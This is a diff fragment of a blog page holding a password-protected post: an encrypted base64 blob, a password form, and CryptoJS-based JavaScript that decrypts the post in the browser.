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;^</div>
+<div id="pec-decrypted-content">
+    <h4><i>This content is encrypted. Click on "Continue Reading" to activate the password field.</i></h4>
+</div>
+
+<form id="pec-decrypt-form">
+    <label for="pec-content-password">Password</label>
+    <input type="password" id="pec-content-password" placeholder="Password" />
+    <button type="button" id="pec-decrypt-content">Decrypt</button>
+</form>
+
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/core.js"></script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/enc-base64.js"></script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/cipher-core.js"></script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/pad-nopadding.js"></script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/md5.js"></script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/aes.js"></script>
+
+
+<script type="text/javascript">
+    (function () {
+        var strip_padding = function (padded_content, padding_char) {
+            /*
+             * Strips the padding character from decrypted content.
+             */
+            for (var i = padded_content.length; i > 0; i--) {
+                if (padded_content[i - 1] !== padding_char) {
+                    return padded_content.slice(0, i);
+                }
+            }
+        };
+
+        var decrypt_content = function (password, iv_b64, ciphertext_b64, padding_char) {
+            /*
+             * Decrypts the content from the ciphertext bundle.
+             */
+            var key = CryptoJS.MD5(password),
+                iv = CryptoJS.enc.Base64.parse(iv_b64),
+                ciphertext = CryptoJS.enc.Base64.parse(ciphertext_b64),
+                bundle = {
+                    key: key,
+                    iv: iv,
+                    ciphertext: ciphertext
+                };
+
+            var plaintext = CryptoJS.AES.decrypt(bundle, key, { iv: iv, padding: CryptoJS.pad.NoPadding });
+
+            try {
+                return strip_padding(plaintext.toString(CryptoJS.enc.Utf8), padding_char);
+            }
+            catch (err) {
+                // encoding failed; wrong password
+                return false;
+            }
+        };
+
+
+        document.addEventListener('DOMContentLoaded', function () {
+            var decrypt_btn = document.getElementById('pec-decrypt-content'),
+                password_input = document.getElementById('pec-content-password'),
+                encrypted_content = document.getElementById('pec-encrypted-content'),
+                decrypted_content = document.getElementById('pec-decrypted-content'),
+                decrypt_form = document.getElementById('pec-decrypt-form');
+
+            var decrypt_document = function (event) {
+                // grab the ciphertext bundle
+                var parts = encrypted_content.innerHTML.split(';');
+
+                // decrypt it
+                var content = decrypt_content(
+                    password_input.value,
+                    parts[0],
+                    parts[1],
+                    parts[2]
+                );
+
+                if (content) {
+                    // success; display the decrypted content
+                    decrypted_content.innerHTML = content;
+                    decrypt_form.parentNode.removeChild(decrypt_form);
+                    encrypted_content.parentNode.removeChild(encrypted_content);
+
+                    // any post processing on the decrypted content should be done here
+                }
+                else {
+                    // ¯\_(ツ)_/¯
+                    password_input.value = '';
+                }
+                event.preventDefault();
+                return false;
+            }
+            
+            decrypt_btn.addEventListener('click', decrypt_document);
+            decrypt_form.addEventListener('submit', decrypt_document);
+        });
+    })();
+</script>
   </div>
   <div class="tag-cloud">
     <p>
